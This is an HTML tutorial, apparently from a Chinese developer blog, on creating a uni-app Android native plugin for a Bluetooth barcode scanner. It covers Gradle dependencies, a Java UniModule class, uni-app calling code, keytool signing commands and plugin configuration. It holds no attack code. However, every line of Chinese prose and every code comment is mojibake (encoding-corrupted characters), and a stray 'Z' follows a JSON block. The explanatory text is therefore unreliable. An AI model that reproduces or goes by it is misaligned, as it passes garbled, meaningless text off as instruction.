<p>æˆ‘ä»¬åœ¨å®˜æ–¹ç¤ºä¾‹çš„é¡¹ç›®ä¸Šï¼Œæ–°å»ºä¸€ä¸ª<strong>blue_scan</strong>çš„æ¨¡å—</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c475b18d4acc4306adc74c51f8f5904a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmVzcG9uc2VTdGF0ZTIwMA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666746&amp;x-signature=syzTkaMGgDgjTlZdKRFKHCqiHEo%3D" alt="image.png" loading="lazy"/></p>
<p>é€‰æ‹©<strong>Android Library</strong>,å¡«å†™æ¨¡å—åç§°</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d6586998996649c090de076498788262~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmVzcG9uc2VTdGF0ZTIwMA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666746&amp;x-signature=N5lHfOYgqOqDq3xuz9HR3UiHCMg%3D" alt="image.png" loading="lazy"/></p>
<p>æ–°å»ºä¹‹åï¼Œç­‰å¾…ä¾èµ–åŒ…å®‰è£…å®Œæˆã€‚
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/329162bb321f44f29a1cb973d635eb5b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmVzcG9uc2VTdGF0ZTIwMA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666746&amp;x-signature=QaUIYrn9TZZST6dkHzydYwsVYls%3D" alt="image.png" loading="lazy"/></p>
<p>åœ¨æ¨¡å—çš„<strong>build.gradle</strong>ä¾èµ–æ–‡ä»¶ä¸ŠåŠ ä¸Šæ’ä»¶ç¼–å†™å¿…è¦çš„ä¾èµ–åŒ…ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©ç›´æ¥ä»<strong>uniplugin_module</strong>ä¸‹çš„<strong>build.gradle</strong>ä¸­çš„<strong>dependencies</strong>ä¾èµ–é¡¹æ‹·è´è¿‡æ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬æ¨¡å—çš„<strong>build.gradle</strong>ä¸‹çš„<strong>dependencies</strong>å°±åº”è¯¥å˜æˆä¸‹é¢çš„æ ·å­ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/da19c558656047df919c53eefd12626e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmVzcG9uc2VTdGF0ZTIwMA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666746&amp;x-signature=Q2rO8FEYlo29C0uB6bder3skrJ8%3D" alt="image.png" loading="lazy"/></p>
<pre><code class="hljs language-javascript" lang="javascript">dependencies {

    compileOnly <span class="hljs-title function_">fileTree</span>(<span class="hljs-attr">dir</span>: <span class="hljs-string">'libs'</span>, <span class="hljs-attr">include</span>: [<span class="hljs-string">'*.jar'</span>])
    compileOnly <span class="hljs-title function_">fileTree</span>(<span class="hljs-attr">dir</span>: <span class="hljs-string">'../app/libs'</span>, <span class="hljs-attr">include</span>: [<span class="hljs-string">'uniapp-v8-release.aar'</span>])
    compileOnly <span class="hljs-string">'androidx.recyclerview:recyclerview:1.0.0'</span>
    compileOnly <span class="hljs-string">'androidx.legacy:legacy-support-v4:1.0.0'</span>
    compileOnly <span class="hljs-string">'androidx.appcompat:appcompat:1.0.0'</span>
    implementation <span class="hljs-string">'com.alibaba:fastjson:1.2.83'</span>
    implementation <span class="hljs-string">'com.facebook.fresco:fresco:1.13.0'</span>


    implementation <span class="hljs-string">'androidx.core:core-ktx:1.17.0'</span>
    implementation <span class="hljs-string">'androidx.appcompat:appcompat:1.7.1'</span>
    implementation <span class="hljs-string">'com.google.android.material:material:1.13.0'</span>
    testImplementation <span class="hljs-string">'junit:junit:4.13.2'</span>
    androidTestImplementation <span class="hljs-string">'androidx.test.ext:junit:1.3.0'</span>
    androidTestImplementation <span class="hljs-string">'androidx.test.espresso:espresso-core:3.7.0'</span>
}
</code></pre>
<p>ç„¶ååŒæ­¥ä¸€ä¸‹ä¾èµ–ï¼Œå°±ä¼šè‡ªåŠ¨å®‰è£…ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9ac1318cd6c54c46b3e747971dfbf868~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmVzcG9uc2VTdGF0ZTIwMA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666746&amp;x-signature=zwygISLeSK7xJR93NUEQHJE56Lg%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-7">æ’ä»¶ä»£ç ç¼–å†™</h2>
<p>åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬çš„æ’ä»¶é¡¹ç›®å·²ç»æ–°å»ºå¥½äº†ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥ç€æ‰‹å†™å¯¹åº”çš„ä»£ç äº†</p>
<h3 data-id="heading-8">æ–°å»ºä¸€ä¸ªBlueScanç±»</h3>
<p>åœ¨æˆ‘ä»¬é¡¹ç›®æ ¹ç›®å½•ä¸‹çš„ <strong>/blue_scan/src/main/java/com.example.blue_scan</strong> ä¸‹æ–°å»ºä¸€ä¸ªåä¸ºBlueScançš„javaçš„classç±»</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c9e496bb9f2413087e7fe72135c5d6d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmVzcG9uc2VTdGF0ZTIwMA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666746&amp;x-signature=ARVONW5BPwxx%2BP48sp4GW7pEVmE%3D" alt="image.png" loading="lazy"/></p>
<p>æ’ä»¶ç±»å¿…é¡»ç»§æ‰¿<strong>UniModule</strong>ï¼Œæ‰€æœ‰æˆ‘ä»¬å°†ä»£ç ä¿®æ”¹æˆä¸‹é¢çš„æ ·å­ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.blue_scan;
<span class="hljs-keyword">import</span> io.dcloud.feature.uniapp.common.UniModule;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BlueScan</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UniModule</span> {

}
</code></pre>
<h3 data-id="heading-9">è¿æ¥è“ç‰™æ‰«ææ‹,ä¸æ–­å¼€è“ç‰™æ‰«ææ‹å‡½æ•°</h3>
<p>æœ‰å‡ ä¸ªæ³¨æ„ç‚¹ï¼š</p>
<ol>
<li>å‡½æ•°å¿…é¡»æ˜¯public</li>
<li>éœ€è¦ä½¿ç”¨@UniJSMethod(uiThread = true)è£…é¥°å™¨</li>
<li>å®‰å“åŸç”Ÿç»™uniappä¼ å‚éœ€è¦é€šè¿‡UniJSCallback</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.blue_scan;
<span class="hljs-keyword">import</span> io.dcloud.feature.uniapp.annotation.UniJSMethod;
<span class="hljs-keyword">import</span> io.dcloud.feature.uniapp.bridge.UniJSCallback;
<span class="hljs-keyword">import</span> io.dcloud.feature.uniapp.common.UniModule;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BlueScan</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UniModule</span> {
    <span class="hljs-meta">@UniJSMethod(uiThread = true)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">connectBlueScan</span><span class="hljs-params">(UniJSCallback callback)</span>{
    <span class="hljs-comment">// è¿æ¥è“ç‰™æ‰«ææ‹æˆåŠŸï¼Œè¿™é‡Œçš„trueå¯ä»¥åœ¨uniappä»£ç ä¸­æ‹¿åˆ°ï¼Œæ‰€ä»¥é€šè¿‡è¿™ç§æ–¹å¼ä¼ é€’æ•°æ®</span>
        callback.invoke(<span class="hljs-literal">true</span>);
    }

    <span class="hljs-meta">@UniJSMethod(uiThread = true)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">disconnectBlueScan</span><span class="hljs-params">(UniJSCallback callback)</span>{
        <span class="hljs-comment">// æ–­å¼€è“ç‰™æ‰«æå™¨</span>
        callback.invoke(<span class="hljs-literal">true</span>);
    }
}
</code></pre>
<h3 data-id="heading-10">è·å–è“ç‰™æ‰«ææ‹çš„æ•°æ®</h3>
<p>è¿™é‡Œè·Ÿä¸Šé¢çš„å‡½æ•°ä¼šæœ‰ä¸€ç‚¹ä¸ä¸€æ ·ï¼Œå› ä¸ºè“ç‰™æ‰«ææ‹çš„æ•°æ®ä¼ é€’æ˜¯éœ€è¦å¤šæ¬¡ä¼ é€’çš„ï¼Œä¹Ÿå¯ä»¥ç®€å•ç†è§£éœ€è¦ä¸€ä¸ªç±»ä¼¼äº'<strong>é•¿é“¾æ¥çš„æ¦‚å¿µ</strong>'ï¼Œ<strong>è¿™é‡Œæœ‰ä¸€ä¸ªéœ€è¦æ³¨æ„çš„ç‚¹ï¼ï¼ï¼</strong>ï¼Œåœ¨uniappçš„ä»£ç ä¸­éœ€è¦é€šè¿‡å¯¹è±¡åµŒå¥—å‡½æ•°çš„æ–¹å¼ä¼ è¿™ä¸ªå›è°ƒå‡½æ•°ã€‚å¦åˆ™åªæœ‰ç¬¬ä¸€æ¬¡ä¼šè°ƒç”¨æˆåŠŸï¼Œè¿™ä¸ªåº”è¯¥è·Ÿå®‰å“çš„åƒåœ¾å›æ”¶æœºåˆ¶æœ‰å…³ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@UniJSMethod(uiThread = true)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getBlueScanData</span><span class="hljs-params">(UniJSCallback callback)</span>{
    <span class="hljs-comment">// ä¼ é€’è“ç‰™æ‰«ææ‹çš„æ•°æ®ï¼Œéœ€è¦å¤šæ¬¡ä¼ é€’çš„è¯ï¼Œå°±ä½¿ç”¨invokeAndKeepAliveçš„æ–¹å¼</span>
    callback.invokeAndKeepAlive(<span class="hljs-number">1</span>);
}
</code></pre>
<p>uniapp è°ƒç”¨æ—¶ï¼ˆ<strong>è¿™é‡Œæ˜¯ä¼ªä»£ç </strong>ï¼‰,çœ‹ä¸‹é¢ä»£ç çš„æ–¹å¼æ‰èƒ½ä¿è¯<strong>invokeAndKeepAlive</strong>çš„æ–¹å¼æ­£å¸¸ç”Ÿæ•ˆã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> callBackObj = {
    <span class="hljs-comment">// éœ€è¦ä½¿ç”¨å¯¹è±¡åµŒå¥—å‡½æ•°çš„æ–¹å¼ä¼ é€’ï¼Œæ‰èƒ½ä¿è¯æ­£å¸¸ä¼ é€’æ•°æ®</span>
    <span class="hljs-attr">fn</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>){
        
    }
}

blueScan.<span class="hljs-title function_">getBlueScanData</span>(callBackObj.<span class="hljs-property">fn</span>)
</code></pre>
<h3 data-id="heading-11">å®‰å“é¡¹ç›®ä¸­æ³¨å†Œæ’ä»¶æ¨¡å—</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1ce1de31526c4d79b4fc5782262325be~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmVzcG9uc2VTdGF0ZTIwMA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666746&amp;x-signature=TxCFJIhf0TnQYezGlWyKqf7V4PE%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-12">æ’ä»¶è°ƒè¯•</h2>
<p>å®‰å“åŸç”Ÿçš„ä»£ç è°ƒè¯•ï¼Œæœ€æ–¹ä¾¿çš„æ–¹å¼å°±æ˜¯å®˜æ–¹ç¤ºä¾‹ä¸­çš„æ–¹å¼ï¼Œé€šè¿‡æ‰“åŒ…uniappçš„æœ¬åœ°èµ„æºæ”¾åˆ°å®‰å“é¡¹ç›®ä¸­è¿›è¡Œè°ƒè¯•ï¼Œå› ä¸ºuniappæ˜¯æ— æ³•çœ‹åˆ°å®‰å“åŸç”Ÿæ’ä»¶æ‰“å°çš„ä¸€äº›è¾“å‡ºçš„ï¼Œå¹¶ä¸”uniappæ˜¯éœ€è¦æ‰“åŒ…è‡ªå®šä¹‰åŸºåº§æ‰èƒ½ä½¿ç”¨å®‰å“åŸç”Ÿæ’ä»¶ï¼Œæ¯æ¬¡æ”¹åŠ¨æ’ä»¶éƒ½éœ€è¦é‡æ–°æ‰“åŒ…è‡ªå®šä¹‰åŸºåº§ï¼Œæ•ˆç‡éå¸¸æ…¢ã€‚æ‰€ä»¥æˆ‘ä»¬ä¸‹é¢ä½¿ç”¨å®˜æ–¹ç¤ºä¾‹ä¸­çš„æ–¹å¼</p>
<h3 data-id="heading-13">uniappé¡¹ç›®ä»£ç ä¸­ï¼Œå¼•ç”¨æ’ä»¶ï¼Œå¹¶ä¸”è°ƒç”¨ã€‚</h3>
<p>uniappä¸­å†™å¦‚ä¸‹ä»£ç ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript">&lt;template&gt;
	<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"content"</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">tap</span>=<span class="hljs-string">"connectBlueScan"</span>&gt;</span>è¿æ¥è“ç‰™<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">tap</span>=<span class="hljs-string">"disconnectBlueScan"</span>&gt;</span>æ–­å¼€è“ç‰™<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">tap</span>=<span class="hljs-string">"getBlueScan"</span>&gt;</span>è·å–è“ç‰™æ•°æ®<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
	<span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span></span>
&lt;/template&gt;

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
	<span class="hljs-comment">// è“ç‰™åŸç”Ÿæ’ä»¶,è¿™é‡Œçš„åç§°å°±æ˜¯åœ¨å®‰å“é¡¹ç›®ä¸­dcloud_uniplugins.jsonä¸­å†™çš„name</span>
	<span class="hljs-keyword">const</span> blueScanNativePlugin = uni.requireNativePlugin(<span class="hljs-string">'BlueScan'</span>);
	<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
		<span class="hljs-title function_">data</span>(<span class="hljs-params"/>) {
			<span class="hljs-keyword">return</span> {
				<span class="hljs-attr">title</span>: <span class="hljs-string">'Hello'</span>
			}
		},
		<span class="hljs-title function_">onLoad</span>(<span class="hljs-params"/>) {

		},
		<span class="hljs-attr">methods</span>: {
			<span class="hljs-title function_">connectBlueScan</span>(<span class="hljs-params"/>){
				blueScanNativePlugin.<span class="hljs-title function_">connectBlueScan</span>(<span class="hljs-function">(<span class="hljs-params">data</span>)=&gt;</span>{
					<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'connectBlueScan---'</span>,data)
				})
			},
			<span class="hljs-title function_">disconnectBlueScan</span>(<span class="hljs-params"/>){
				blueScanNativePlugin.<span class="hljs-title function_">disconnectBlueScan</span>(<span class="hljs-function">(<span class="hljs-params">data</span>)=&gt;</span>{
					<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'disconnectBlueScan-----'</span>,data)
				})
			},
			<span class="hljs-title function_">getBlueScan</span>(<span class="hljs-params"/>){
				
				<span class="hljs-keyword">const</span> callBack = {
					<span class="hljs-attr">fn</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>){
						<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'getBlueScan----'</span>,data)
					}
				}
				
				blueScanNativePlugin.<span class="hljs-title function_">getBlueScanData</span>(callBack.<span class="hljs-property">fn</span>)
			},
		}
	}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
	<span class="hljs-selector-class">.content</span> {
		<span class="hljs-attribute">display</span>: flex;
		<span class="hljs-attribute">flex-direction</span>: column;
		<span class="hljs-attribute">align-items</span>: center;
		<span class="hljs-attribute">justify-content</span>: center;
	}

	<span class="hljs-selector-class">.logo</span> {
		<span class="hljs-attribute">height</span>: <span class="hljs-number">200</span>rpx;
		<span class="hljs-attribute">width</span>: <span class="hljs-number">200</span>rpx;
		<span class="hljs-attribute">margin-top</span>: <span class="hljs-number">200</span>rpx;
		<span class="hljs-attribute">margin-left</span>: auto;
		<span class="hljs-attribute">margin-right</span>: auto;
		<span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">50</span>rpx;
	}

	<span class="hljs-selector-class">.text-area</span> {
		<span class="hljs-attribute">display</span>: flex;
		<span class="hljs-attribute">justify-content</span>: center;
	}

	<span class="hljs-selector-class">.title</span> {
		<span class="hljs-attribute">font-size</span>: <span class="hljs-number">36</span>rpx;
		<span class="hljs-attribute">color</span>: <span class="hljs-number">#8f8f94</span>;
	}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span>
</code></pre>
<p>åˆ°uniappå¼€å‘è€…åå°åˆ›å»ºandroidçš„ç¦»çº¿key</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6b62d1b1fd7c4b6aa7b07d3a8ff219cf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmVzcG9uc2VTdGF0ZTIwMA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666746&amp;x-signature=jYm0SJGs95fEiAGDR7EK2Kw%2BUMI%3D" alt="image.png" loading="lazy"/></p>
<p>è¿™ä¸ªæ—¶å€™ä¼šéœ€è¦ç”¨åˆ°å®‰å“çš„ç­¾åä¿¡æ¯ï¼Œæˆ‘ä»¬ç”Ÿæˆä¸€ä¸ªå®‰å“çš„ç­¾åï¼Œæˆ‘ä»¬é€šè¿‡keytoolå‘½ä»¤è¡Œçš„å½¢å¼æ¥ç”Ÿæˆï¼Œä¸‹é¢åªæ˜¯ç¤ºä¾‹ï¼Œå…·ä½“çš„ä¿¡æ¯å¯ä»¥æ ¹æ®è‡ªå·±çš„è¦æ±‚æ¥å¡«å†™ã€‚</p>
<pre><code class="hljs language-vbnet" lang="vbnet">keytool -genkey -v -keystore my-release-<span class="hljs-keyword">key</span>.jks -keyalg RSA -keysize <span class="hljs-number">2048</span> -validity <span class="hljs-number">10000</span> -<span class="hljs-keyword">alias</span> my-<span class="hljs-keyword">alias</span>
</code></pre>
<p>æŸ¥çœ‹ç­¾åä¸­çš„ä¿¡æ¯ï¼Œåˆ°åå°ä¸­è¿›å…¥å¡«å…¥ã€‚</p>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-comment"># æŸ¥çœ‹ç­¾åä¿¡æ¯</span>
keytool -list -v -keystore <span class="hljs-keyword">my</span>-release-key.jks
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0589a9eb094148188f327fc811243602~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmVzcG9uc2VTdGF0ZTIwMA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666746&amp;x-signature=%2BwuJe2tIMmQLoW1uGKrxSnrLHeY%3D" alt="image.png" loading="lazy"/></p>
<p>ä¿å­˜å¥½ä¹‹åï¼Œå°±å¯ä»¥ç”Ÿæˆçš„ç¦»çº¿keyï¼Œå¡«å†™åˆ°å®‰å“é¡¹ç›®ä¸­</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6ca491ee100f4ab6aedc3f923495db79~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmVzcG9uc2VTdGF0ZTIwMA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666746&amp;x-signature=S%2Bkuv7N0IZ6s99utqSfz3VtVLUE%3D" alt="image.png" loading="lazy"/></p>
<p>æŠŠå®‰å“çš„ç­¾åæ–‡ä»¶æ”¾åˆ°å®‰å“é¡¹ç›®ä¸­çš„appæ–‡ä»¶å¤¹çš„æ ¹ç›®å½•ä¸Šï¼Œå¹¶å¡«å†™å¯¹åº”çš„ç­¾åé…ç½®</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/661b46633ecc4aa4847efb9642855f19~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmVzcG9uc2VTdGF0ZTIwMA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666746&amp;x-signature=DIy%2FH1dkj6yUPSebfUCsEBngsa8%3D" alt="image.png" loading="lazy"/></p>
<p>åœ¨uniappé¡¹ç›®ä¸­æ–°å»ºä¸€ä¸ª<strong>nativeplugins</strong>çš„æ–‡ä»¶å¤¹ï¼Œè¿™ä¸ªåç§°æ˜¯å›ºå®šçš„ï¼Œå­˜æ”¾å®‰å“æ’ä»¶å†…å®¹ã€‚åœ¨è¿™ä¸ªç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªç›®å½•æ’ä»¶çš„åç§°ï¼Œæˆ‘ä»¬å°±å«BlueScan,åœ¨ä¸‹é¢æ–°å»ºä¸€ä¸ªpackage.jsonã€‚</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"BlueScan"</span><span class="hljs-punctuation">,</span> 
  <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"BlueScan"</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// IDå¿…é¡»å”¯ä¸€</span>
  <span class="hljs-attr">"version"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"1.0.0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"_dp_type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"nativeplugin"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"_dp_nativeplugin"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"android"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"hooksClass"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">""</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"integrateType"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"aar"</span><span class="hljs-punctuation">,</span>
	  <span class="hljs-attr">"plugins"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">{</span>
	  	<span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"module"</span><span class="hljs-punctuation">,</span>
	  	<span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"BlueScan"</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// åœ¨uniappè¿™è¾¹è°ƒç”¨çš„æ—¶å€™æ’ä»¶çš„åç§°</span>
	  	<span class="hljs-attr">"class"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"com.example.blue_scan.BlueScan"</span> <span class="hljs-comment">// å®‰å“åŸç”Ÿé¡¹ç›®ä¸Šçš„åŒ…å</span>
	  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">]</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
Z
</code></pre>
<p>å¡«å†™å¥½å†…å®¹ä¹‹åï¼Œæˆ‘ä»¬åœ¨uniappé¡¹ç›®ä¸­çš„mainfest.jsoné…ç½®ä¸Šå‹¾é€‰è¿™ä¸ªå®‰å“åŸç”Ÿæ’ä»¶ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f5924cb1a64446b99f77afa8a13adf61~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmVzcG9uc2VTdGF0ZTIwMA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666746&amp;x-signature=UtKvn1OefYOTs%2Fb8A25G%2FBFncS0%3D" alt="image.png" loading="lazy"/></p>
<p>å‹¾é€‰å®Œä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥å°†uniappä»£ç æ‰“åŒ…æœ¬åœ°èµ„æºã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/85d5acc1f62c4037b6e15c4f49fa0773~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmVzcG9uc2VTdGF0ZTIwMA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666746&amp;x-signature=MiWWVsqLyHiC4vwUmDBl5c0d0%2FU%3D" alt="image.png" loading="lazy"/></p>
<p>æ‰“åŒ…å‡ºæ¥çš„èµ„æºæ”¾åˆ°å®‰å“é¡¹ç›®ä¸‹app/src/main/assets/apps</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e778a48228ed4e0391143e11b6805189~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmVzcG9uc2VTdGF0ZTIwMA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666746&amp;x-signature=HNf36bAc8kl5mm%2BXFaxFt36qBGw%3D" alt="image.png" loading="lazy"/></p>
<p>ä¿®æ”¹dcloud_control.xmlæ–‡ä»¶ä¸­çš„appidï¼Œä¸ºuniappèµ„æºåŒ…çš„æ–‡ä»¶å</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ad164837a2cf4e85b2809ae99d74b3ab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmVzcG9uc2VTdGF0ZTIwMA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666746&amp;x-signature=tV6z6dhJ6JnwuoMtHTtUu7kFu5I%3D" alt="image.png" loading="lazy"/></p>
<p>å¦‚æœéœ€è¦æ˜¾ç¤ºå‡ºuniappè¿™è¾¹çš„æ‰“å°æ—¥å¿—åˆ°å®‰å“è¿™è¾¹çš„æ§åˆ¶å°ä¸Šçš„è¯ï¼Œå°±ä¿®æ”¹ä¸€ä¸‹dcloud_control.xmlæ–‡ä»¶ï¼ŒåŠ ä¸Šä¸‹é¢çš„ä»£ç ï¼Œ<strong>éœ€è¦æ³¨æ„åŠ ä¸Šäº†è¿™ä¸ªä»£ç çš„è¯ï¼Œæœ€å¥½æ¯æ¬¡éƒ½åˆ é™¤Appé‡æ–°å®‰è£…ï¼Œå¦åˆ™ä¼šå‡ºç°ä»£ç ç¼“å­˜çš„é—®é¢˜ï¼Œå¹¶ä¸”åœ¨ç”Ÿäº§å‘å¸ƒçš„æ—¶å€™éœ€è¦å»æ‰è¿™æ®µä»£ç </strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/101eb826a3054548a4fb8c168e4023ed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmVzcG9uc2VTdGF0ZTIwMA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666746&amp;x-signature=FWnNYMwwMvfd1VBuiUGFTfgM58Q%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-14">è¿è¡Œåˆ°çœŸæœº</h2>
<p>å‰é¢æ‰€æœ‰çš„å·¥ä½œéƒ½ç®—åšå®Œäº†ï¼Œæ²¡æœ‰é—®é¢˜çš„è¯ï¼Œæˆ‘ä»¬è¿æ¥ä¸Šæ‰‹æœºï¼Œç„¶åç›´æ¥è¿è¡Œåˆ°çœŸæœºï¼Œå½“å½“å½“~èƒ½æ­£å¸¸çœ‹åˆ°æ‰“å°çš„æ—¥å¿—</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/64c6277e19514f32adc4540009e5b641~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmVzcG9uc2VTdGF0ZTIwMA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666746&amp;x-signature=YFHiQ1CGSmxILqicMF0SCsUMWk4%3D" alt="image.png" loading="lazy"/></p>
